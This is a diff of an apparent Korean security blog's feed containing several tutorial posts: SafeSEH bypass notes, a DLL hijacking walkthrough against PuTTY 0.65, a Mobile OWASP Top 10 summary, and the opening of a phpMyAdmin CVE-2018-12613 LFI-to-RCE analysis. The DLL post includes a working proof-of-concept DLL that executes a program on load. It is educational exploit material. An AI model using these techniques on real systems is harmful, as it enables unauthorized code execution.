+&lt;p&gt;실제 환경에서는 ASLR, Safe SEH 등이 기본적으로 적용되어 있기 때문에 내가 원하는 함수의 주소를 찾아내기 힘들기 때문입니다.&lt;/p&gt;
+
+&lt;p&gt;그래서 이 기법은 ROP를 위한 기본 개념 정도로만 이해하시기 바랍니다.&lt;/p&gt;
+
+&lt;p&gt;글이 너무 길어졌네요. 이만 줄이고 다음 편에서 ROP를 알아보도록 하겠습니다.&lt;/p&gt;</content><author><name>Joel Park</name></author><category term="Posts" /><summary type="html">0x07 DEP(1)</summary></entry><entry><title type="html">windows-0x06</title><link href="/windows-0x06" rel="alternate" type="text/html" title="windows-0x06" /><published>2019-03-18T19:18:00+09:00</published><updated>2019-03-18T19:18:00+09:00</updated><id>/windows-0x06</id><content type="html" xml:base="/windows-0x06">&lt;h1 id=&quot;0x06-gs2&quot;&gt;0x06 GS(2)&lt;/h1&gt;
+
+&lt;h5 id=&quot;safeseh&quot;&gt;SafeSEH&lt;/h5&gt;
+
+&lt;p&gt;SafeSEH는 SEH Overwite를 방어하기 위해 도입된 메모리 보호 기법입니다.&lt;/p&gt;
+
+&lt;p&gt;SafeSEH가 하는 일은 아주 간단합니다.&lt;/p&gt;
+
+&lt;p&gt;Exception Handler가 실행되기 전에 Handler 주소 값에 대한 검증을 수행합니다.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;1) 등록된 Handler의 주소가 STACK인지 확인해서 STACK이면 호출하지 않음.&lt;/li&gt;
+  &lt;li&gt;2) Handler의 주소가 현재 로드된 모듈의 주소이고, SafeSEH 컴파일이 되어 있다면 적절한 절차로 등록된 것인지 검증.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;까다롭죠??&lt;/p&gt;
+
+&lt;p&gt;그런데 해법이 상당이 간단합니다.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;1) Handler의 주소가 STACK이 아니면 된다.&lt;/li&gt;
+  &lt;li&gt;2) SafeSEH 컴파일이 되어 있지 않으면 된다.&lt;/li&gt;
+  &lt;li&gt;결론 : SafeSEH가 안걸려 있는 모듈에서 Gadget을 찾아오면 된다!!&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;간단하죠?&lt;/p&gt;
+
+&lt;p&gt;Immunity Debugger에서 mona.py를 이용하면 Module들에 어떤 보호기법들이 적용되어 있는지 확인할 수 있습니다.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;!mona modules
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x06_1.png&quot; alt=&quot;[그림 1-1]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;이 중에 SafeSEH가 적용되어 있지 않은 Module을 골라서 우회 공격을 동일하게 진행하면 됩니다.&lt;/p&gt;
+
+&lt;p&gt;이상으로 GS편을 모두 마치겠습니다.&lt;/p&gt;</content><author><name>Joel Park</name></author><category term="Posts" /><summary type="html">0x06 GS(2)</summary></entry><entry><title type="html">DLL Hijacking &amp;amp; Ghidra</title><link href="/Dll-Hijacking-&-Ghidra" rel="alternate" type="text/html" title="DLL Hijacking &amp; Ghidra" /><published>2019-03-17T19:18:00+09:00</published><updated>2019-03-17T19:18:00+09:00</updated><id>/Dll%20Hijacking%20&amp;%20Ghidra</id><content type="html" xml:base="/Dll-Hijacking-&amp;-Ghidra">&lt;h1 id=&quot;dll-hijacking--ghidra&quot;&gt;DLL Hijacking &amp;amp; Ghidra&lt;/h1&gt;
+
+&lt;p&gt;안녕하세요. Joel입니다.&lt;/p&gt;
+
+&lt;p&gt;방구석에 누워있다 갑자기 DLL Hijacking 포스팅을 올리라는 일거리를 받아서 글을 쓰게 되었습니다. 허허..&lt;/p&gt;
+
+&lt;h5 id=&quot;overview&quot;&gt;Overview&lt;/h5&gt;
+
+&lt;p&gt;DLL Hijacking은 PE 프로그램이 의도하지 않은 external library(dll)을 실행하도록 만드는 것 입니다. 
+이 공격은 DLL Search Order 때문에 취약한 PE 프로그램이 공격자가 작성한 DLL을 로드하고 실행하게 됩니다.
+지금부터, 취약한 프로그램 분석과 Hijacking할 dll을 찾는 과정 등을 하나씩 살펴보도록 하겠습니다.&lt;/p&gt;
+
+&lt;p&gt;먼저, 오늘 포스팅에서 사용한 Tool과 환경구축 내용입니다.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Ghidra (jdk 11 이상, 64bit 필수)&lt;/li&gt;
+  &lt;li&gt;PuTTY 0.65&lt;/li&gt;
+  &lt;li&gt;Sysinternals suite&lt;/li&gt;
+  &lt;li&gt;Visual Studio 2017&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h5 id=&quot;find-the-dlls-which-are-loaded-by-target-application&quot;&gt;Find the dlls which are loaded by target application.&lt;/h5&gt;
+
+&lt;h6 id=&quot;procexp&quot;&gt;Procexp&lt;/h6&gt;
+
+&lt;p&gt;PuTTY 0.65를 실행한 뒤, Sysinternals의 Procexp.exe를 통해 어떤 dll들을 사용하는지 확인해보겠습니다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/dll/0x00_2.png&quot; alt=&quot;[그림 1-1]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;Procexp.exe에서 [View]-[Lower Pane View]-[DLLs] 설정을 하면 PuTTY 프로그램이 로드한 dll 목록들을 확인할 수 있습니다.
+그런데 이것만 가지고는 어떤 dll을 hijack할 수 있는지 알 수가 없습니다. 결과만 보이기 때문이죠.&lt;/p&gt;
+
+&lt;p&gt;그래서 이번에는 Sysinternals의 Procmon을 실행시켜서 dll이 로드되는 과정을 살펴보겠습니다.&lt;/p&gt;
+
+&lt;h6 id=&quot;procmon&quot;&gt;Procmon&lt;/h6&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/dll/0x00_3.png&quot; alt=&quot;[그림 1-2]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;Procmon을 실행한 후 필터를 위와 같이 설정합니다. 그럼 아래와 같이 PuTTY가 dll을 로드하는 과정에서 발생한 내용들을 볼 수가 있습니다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/dll/0x00_4.png&quot; alt=&quot;[그림 1-3]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;위 그림과 Procexp의 내용을 종합해보면 PuTTY는 WINMM.dll을 자신이 있는 디렉터리에서 먼저 찾아서 로드하려고 한다는 것을 알 수 있습니다.&lt;/p&gt;
+
+&lt;p&gt;하지만 해당 디렉터리에는 WINMM.dll이 없기에 결과적으로는 C:\Windows\SysWOW64\WINMM.dll을 로드하고 있습니다.&lt;/p&gt;
+
+&lt;p&gt;만약 해당 디렉터리에 이 WINMM.dll이 존재한다면 어떻게 될까요? ^^&lt;/p&gt;
+
+&lt;p&gt;아 물론, 여기서 해당 디렉터리에 low priv user가 Write Access가 가능하다는 전제하에 진행하는 것입니다.&lt;/p&gt;
+
+&lt;p&gt;만약, 해당 디렉터리가 C:\, C:\Program Files 등 Admin 권한이 필요한 경우에는 UAC 팝업이 뜨겠죠?&lt;/p&gt;
+
+&lt;p&gt;UAC 팝업은 쉽게 우회가 가능하나, 이 글의 범위를 넘어서므로 바탕화면 특정 디렉터리에서 진행합니다.&lt;/p&gt;
+
+&lt;p&gt;계속 갑니닷.&lt;/p&gt;
+
+&lt;h6 id=&quot;find-a-target-function-with-ghidra&quot;&gt;Find a Target Function with Ghidra&lt;/h6&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/dll/0x00_5.png&quot; alt=&quot;[그림 1-4]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;Target Function을 Ghidra를 이용해서 찾아보겠습니다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/dll/0x00_1.png&quot; alt=&quot;[그림 1-5]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;[Symbol Tree] - [Imports] - [WINMM.dll]을 따라가면 PlaySoundA라는 함수를 찾을 수 있습니다. 쉽죠??&lt;/p&gt;
+
+&lt;p&gt;그럼 이제 우리가 해야할 일은 Hijacking에 사용할 dll을 만드는 것 입니다.&lt;/p&gt;
+
+&lt;h6 id=&quot;make-a-dll&quot;&gt;Make a DLL&lt;/h6&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &quot;stdafx.h&quot;
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+
+	switch (ul_reason_for_call) {
+	case DLL_PROCESS_ATTACH:
+		WinExec(&quot;calc&quot;, SW_NORMAL);
+	case DLL_THREAD_ATTACH:
+	case DLL_THREAD_DETACH:
+	case DLL_PROCESS_DETACH:
+		break;
+
+	}
+	return true;
+}
+
+extern &quot;C&quot; __declspec(dllexport) void PlaySoundA() {
+	WinExec(&quot;calc&quot;, SW_NORMAL);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;위와 같이 PuTTY가 실행될 때 계산기를 실행하도록 새로운 dll을 생성했습니다.&lt;/p&gt;
+
+&lt;h6 id=&quot;execute-target-program&quot;&gt;Execute Target Program&lt;/h6&gt;
+
+&lt;p&gt;아래와 같이, 같은 디렉터리에 방금 만든 dll을 위치시킨 후, 실행해보겠습니다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/dll/0x00_6.png&quot; alt=&quot;[그림 1-6]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/dll/0x00_7.png&quot; alt=&quot;[그림 1-7]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;계산기가 잘 실행되네요. ^^&lt;/p&gt;
+
+&lt;p&gt;지금까지 DLL Hijacking에 대해서 알아봤습니다. 뿅!&lt;/p&gt;</content><author><name>Joel Park</name></author><category term="Posts" /><summary type="html">DLL Hijacking &amp;amp; Ghidra</summary></entry><entry><title type="html">mobile-0x00</title><link href="/android-0x00" rel="alternate" type="text/html" title="mobile-0x00" /><published>2019-03-16T06:00:00+09:00</published><updated>2019-03-16T06:00:00+09:00</updated><id>/android-0x00</id><content type="html" xml:base="/android-0x00">&lt;h1 id=&quot;0x00-introduction&quot;&gt;0x00. Introduction&lt;/h1&gt;
+
+&lt;p&gt;안녕하세요. Chaem 입니다.&lt;/p&gt;
+
+&lt;p&gt;Mobile Android 해킹을 주제로 포스팅을 시작하려고 합니다.
+우선 Mobile OWASP Top 10에 등록된  주요 취약점을 간단히 리뷰하고 이후 해당 취약점들을 이용한 Android 해킹과 관련된 내용으로 포스팅을 진행하도록 하겠습니다.&lt;/p&gt;
+
+&lt;h5 id=&quot;mobile-owasp-top-10&quot;&gt;Mobile OWASP Top 10&lt;/h5&gt;
+&lt;p&gt;OWASP(The Open Web Application Security Project)란 국제 웹 보안 표준기군이며, 웹에 관한 주요 보안 취약점들을 연구하며, 4년 마다 취약점 Top 10 을 발표하고 있습니다. 
+OWASP 모바일 보안 프로젝트는 개발자와 보안팀이 모바일 어플리케이션을 안전하게 구축하고 유지, 관리하는데 필요한 리소스를 제공하며 앞으로 일어날 수 있는 영향도와 위험성을 줄이기 위해 진행되고 있습니다. 2년 마다 취약점 Top 10을 발표하고 있으며, 현재 가장 최신 자료는 2016년 release된 자료입니다.(아래 그림 참조)
+그럼 Mobile OWASP Top 10의 각 취약점에 대해 리뷰해보도록 하겠습니다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/Mobile%20OWASP%20TOP10.png&quot; alt=&quot;[그림 1-1]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;h4 id=&quot;m1---improper-platform-usage&quot;&gt;M1 - Improper Platform Usage&lt;/h4&gt;
+&lt;p&gt;첫번째 M1은 부적절한 플랫폼 사용에 관한 취약점입니다. 
+이 취약점은 플랫폼 기능의 오용이나 보안 설정이 잘못될 경우 발생하는 문제에 대해 다루고 있습니다.
+주로 개발자들의 실수로 인해 발생하며, 문제는 공격 가능성은 쉬우나 그에 따른 영향도가 심각하다는 점입니다.
+대응방안으로는 시큐어 코딩과 보안 설정을 서버 단에서 진행하는 것입니다.&lt;/p&gt;
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/M1.png&quot; alt=&quot;[그림 1-2]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;h4 id=&quot;m2---insecure-data-storage&quot;&gt;M2 - Insecure Data Storage&lt;/h4&gt;
+&lt;p&gt;M2는 취약한 데이터 저장소에 관한 취약점입니다. 
+이 취약점은 안전하지 않은 데이터 저장소로 인해 의도하지 않은 데이터 유출로 발생하는 문제에 대해 다루고 있습니다. 공격 가능성은 쉬우나 영향도는 심각하며 신분 도용, 개인 정보 침해 등의 위험을 초래합니다.
+대응방안은 아래와 같은 기능을 통해 중요 정보를 내부 저장소에 저장하지 않아야 합니다.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;URL caching (both request and response)&lt;/li&gt;
+  &lt;li&gt;Keyboard press caching&lt;/li&gt;
+  &lt;li&gt;Copy/Paste buffer caching&lt;/li&gt;
+  &lt;li&gt;Application backgrounding&lt;/li&gt;
+  &lt;li&gt;Intermediate data&lt;/li&gt;
+  &lt;li&gt;Logging&lt;/li&gt;
+  &lt;li&gt;HTML5 data storage&lt;/li&gt;
+  &lt;li&gt;Browser cookie objects&lt;/li&gt;
+  &lt;li&gt;Analytics data sent to 3rd parties&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/M3.png&quot; alt=&quot;[그림 1-3]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;h4 id=&quot;m3---insecure-communication&quot;&gt;M3 - Insecure Communication&lt;/h4&gt;
+&lt;p&gt;M3는 취약한 통신에 관한 취약점입니다. 이 취약점은 악의적인 handshaking, 잘못된 SSL 버전, 약한 협상, 민감 정보의 평문 통신으로 발생하는 문제에 대해 다루고 있습니다. 공격 가능성은 쉬우나 영향도는 심각하며, 피싱 및 MITM 공격에 의해 중요 정보가 노출될 수 있습니다.
+대응방안은 SSL/TLS 적용, 강한 cipher suites 사용, 인증서 확인 등이 있습니다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/M2.png&quot; alt=&quot;[그림 1-4]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;h4 id=&quot;m4---insecure-authentication&quot;&gt;M4 - Insecure Authentication&lt;/h4&gt;
+&lt;p&gt;M4는 취약한 인증에 관한 취약점입니다. 이 취약점은 사용자 인증 또는 잘못된 세션 관리로 인해 발생하는 문제에 대해 다루고 있습니다. 공격 가능성은 쉬우나 영향도는 심각하며, 대응방안은 약한 인증 패턴을 피하고, 인증을 강화하는 방법입니다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/M4.png&quot; alt=&quot;[그림 1-5]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;h4 id=&quot;m5---insufficient-cryptography&quot;&gt;M5 - Insufficient Cryptography&lt;/h4&gt;
+&lt;p&gt;M5는 취약한 암호화에 관한 취약점입니다. 이 취약점은 키관리 문제, 커스텀 암호화 생성, 취약한 암호화 알고리즘 사용 시 발생하는 문제에 대해 다루고 있습니다. 공격 가능성은 쉬우나 영향도는 심각하며, 대응방안은 모바일 기기에 중요한 정보를 저장하지 말아야 하며, 검증된 암호화 표준을 적용하는 방법입니다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/M5.png&quot; alt=&quot;[그림 1-6]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;h4 id=&quot;m6---insecure-authorization&quot;&gt;M6 - Insecure Authorization&lt;/h4&gt;
+&lt;p&gt;M6는 취약한 권한에 관한 취약점입니다. 이 취약점은 안전하지 않은 권한을 부여하여 발생하는 문제에 대해 다루고 있습니다. 공격 가능성은 쉬우나 영향도는 심각하며, 대응방안은 서버 단에서 사용자의 역할 및 권한을 확인해야 하며, 어플리케이션의 필요한 퍼미션만 설정하는 방법입니다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/M6.png&quot; alt=&quot;[그림 1-7]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;h4 id=&quot;m7---client-code-quality&quot;&gt;M7 - Client Code Quality&lt;/h4&gt;
+&lt;p&gt;M7는 클라이언트 코드 품질에 관한 취약점입니다. 이 취약점은 잘못된 코드 구현으로 인해 클라이언트에서 발생하는 문제에 대해 다루고 있습니다. 공격 가능성은 어렵고 영향도는 보통이며 버퍼오버플로우, XSS등의 취약점으로 이어질 수 있습니다.
+대응방안은 버퍼 사용 시 입력 버퍼의 길이를 확인하는 등 안전한 구문을 사용하는 방법입니다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/M7.png&quot; alt=&quot;[그림 1-8]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;h4 id=&quot;m8---code-tampering&quot;&gt;M8 - Code Tampering&lt;/h4&gt;
+&lt;p&gt;M8는 코드 변조에 관한 취약점입니다. 이 취약점은 바이너리 패치, 로컬 리소스 수정, 메소드 후킹 및 변경, 동적 메모리 수정등 코드 변조 시 발생하는 문제에 대해 다루고 있습니다. 공격 가능성은 쉬우나 영향도는 심각하며, 대응방안은 무결성 체크, 루팅 탐지등의 방법이 있습니다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/M8.png&quot; alt=&quot;[그림 1-9]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;h4 id=&quot;m9---reverse-engineering&quot;&gt;M9 - Reverse Engineering&lt;/h4&gt;
+&lt;p&gt;M9는 역공학에 관한 취약점입니다. 이 취약점은 라이브러리, 알고리즘, 핵심 바이너리 등의 분석을 통해 중요 로직을 파악하여 발생되는 문제 대해 다루고 있습니다. 공격 가능성은 쉬우나 영향도는 보통이며,
+대응방안은 바이너리 암호화와, 코드 난독화를 적용하여 리버싱을 방지하는 방법입니다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/M9.png&quot; alt=&quot;[그림 1-10]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;h4 id=&quot;m10---extraneous-functionality&quot;&gt;M10 - Extraneous Functionality&lt;/h4&gt;
+&lt;p&gt;마지막으로 M10는 불필요한 기능에 관한 취약점입니다. 이 취약점은 개발자가 숨겨놓은 기능이나 운영 환경에 적용하지 않는 개발 환경 기능을 악용하여 발생하는 문제에 대해 다루고 있습니다. 공격 가능성은 쉬우나 영향도는 심각하며, 대응방안은 테스트 코드가 포함되어 있는지 확인하고, 모든 로그를 검사하여 과도한 설명이 포함되어 있는지 확인하는 방법입니다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/M10.png&quot; alt=&quot;[그림 1-11]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;Mobile OWASP Top 10에 대해 간략히 리뷰해봤고, 자세한 내용은 원문에서 확인하실 수 있습니다.
+다음 포스트에서는 IDA를 이용해 정적 분석하는 방법을 알아보도록 하겠습니다.&lt;/p&gt;
+
+&lt;p&gt;감사합니다.&lt;/p&gt;</content><author><name>Chaem</name></author><category term="Posts" /><summary type="html">0x00. Introduction</summary></entry><entry><title type="html">linux_0x03</title><link href="/linux_0x03" rel="alternate" type="text/html" title="linux_0x03" /><published>2019-03-11T19:18:00+09:00</published><updated>2019-03-11T19:18:00+09:00</updated><id>/linux_0x03</id><content type="html" xml:base="/linux_0x03">&lt;h2 id=&quot;0x03---basic-bof--메모리-보호-기법&quot;&gt;0x03 - Basic BOF &amp;amp; 메모리 보호 기법&lt;/h2&gt;
 
 &lt;p&gt;안녕하세요! &lt;strong&gt;Sulla&lt;/strong&gt;임돠….&lt;/p&gt;
 
@@ -228,1296 +1173,4 @@ https://downloads.wordpress.org/plugin/relevanssi.4.0.4.zip&lt;/li&gt;
 고생하셨습니다. 다음 포스팅까지 차근차근 준비해서 다시 뵙겠습니다.&lt;/p&gt;
 
 &lt;p&gt;감사합니다!
-&lt;strong&gt;뿅&lt;/strong&gt;!&lt;/p&gt;</content><author><name>Sulla</name></author><category term="Posts" /><summary type="html">0x03 - Basic BOF &amp;amp; 메모리 보호 기법</summary></entry><entry><title type="html">web-0x02</title><link href="/web-0x02" rel="alternate" type="text/html" title="web-0x02" /><published>2019-03-11T04:00:00+09:00</published><updated>2019-03-11T04:00:00+09:00</updated><id>/web-0x02</id><content type="html" xml:base="/web-0x02">&lt;h1 id=&quot;lfi-to-rce-on-phpmyadmin-480--481&quot;&gt;LFI to RCE on PHPMyAdmin 4.8.0 ~ 4.8.1&lt;/h1&gt;
-
-&lt;p&gt;안녕하세요 hackyu입니다.&lt;/p&gt;
-
-&lt;p&gt;오늘은 CVE-2018-12613 PHPMyAdmin LFI to RCE 취약점에 대한 포스팅입니다.&lt;br /&gt;&lt;br /&gt; 
-해당 취약점은 PMA(PHP My Admin) 버전 4.8.0 ~ 4.8.1에서 발생하는 취약점이며, index.php 요청 시 사용되는 target 파라미터의 값이 조건을 만족하게되는 경우 include()를 통해 발생되는 LFI 취약점을 이용한 RCE 공격입니다.&lt;/p&gt;
-
-&lt;h5 id=&quot;lfi--rce&quot;&gt;LFI / RCE?&lt;/h5&gt;
-
-&lt;p&gt;LFI와 RCE 취약점에 대해 간략하게 설명드리겠습니다.&lt;br /&gt;&lt;br /&gt;
-LFI(Local File Inclusion) 취약점이란 클라이언트에 의한 서버로의 요청 시 반환하는 응답의 결과 내에 서버 내 존재하는 파일이 포함되어 노출되는 취약점을 말합니다.&lt;br /&gt;&lt;br /&gt;
-RCE(Remote Command Execution) 취약점이란 말그대로 원격 명령 실행으로 공격자가 삽입하는 또는 전달하는 값으로 서버 측의 환경에서 시스템 명령어를 실행할 수 있는 취약점을 말합니다.&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;해당 취약점을 이해하기 위해서 세션에 대해서 간략하게 말씀드리자면, 서버가 클라이언트를 식별하는데 사용하는 일종의 별명이라고 생각하시면 될 것 같습니다. 또한, 일반적으로 세션은 서버 측에서 파일로 관리하게 됩니다.&lt;br /&gt;&lt;br /&gt;
-세션이 파일로 관리되는 부분에 대해서는 본 포스팅의 뒷부분 취약점 분석 부분에서 간략히 확인하실 수 있으실 것 같습니다. 더불어 해당 취약점은 관리자로의 접근 이후 단계에서의 진행되는 것으로 생각하시면 될 것 같습니다.&lt;/p&gt;
-
-&lt;h5 id=&quot;취약점-분석&quot;&gt;취약점 분석&lt;/h5&gt;
-&lt;ul&gt;
-  &lt;li&gt;&lt;strong&gt;환경구성&lt;/strong&gt;&lt;br /&gt;
-    &lt;ul&gt;
-      &lt;li&gt;Apache 2.4.18&lt;br /&gt;&lt;/li&gt;
-      &lt;li&gt;PHP 7.0.30&lt;br /&gt;&lt;/li&gt;
-      &lt;li&gt;PHPMyadmin 4.8.1&lt;br /&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/web/0x02_1.png&quot; /&gt;
-  &lt;figcaption&gt;&lt;center&gt;  
-   - LFI to RCE Vulnerability Flow -
-  &lt;/center&gt;&lt;/figcaption&gt;
-&lt;/figure&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;다음은 취약점이 발생한 PHPMyAdmin 4.8.1 소스코드 부분입니다.&lt;br /&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// phpmyadmin 4.8.1 index.php line 53 ~ 62
-&lt;/span&gt;
-&lt;span class=&quot;c1&quot;&gt;// If we have a valid target, let's load that script instead 
-&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'target'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;                            &lt;span class=&quot;c1&quot;&gt;// Request 시 target 파라미터 값 empty 야부
-&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;is_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'target'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;                       &lt;span class=&quot;c1&quot;&gt;// Request 요청 파라미터 target 값의 타입 문자열 여부
-&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;preg_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/^index/'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'target'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;        &lt;span class=&quot;c1&quot;&gt;//Request 요청 파라미터 target값에 'index' 문자열 매칭 여부
-&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;in_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'target'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$target_blacklist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// equest 요청 파라미터 target의 값이 blacklist에 속해 있는지 여부
-&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Core&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;checkPageValidity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'target'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;         &lt;span class=&quot;c1&quot;&gt;// Core 클래스의 checkPageValidity 함수의 인자로 호출 결과 여부
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'target'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;                            &lt;span class=&quot;c1&quot;&gt;// 위의 조건이 만족하는 경우 include
-&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;figure&gt;
-  &lt;figcaption&gt;&lt;center&gt;  
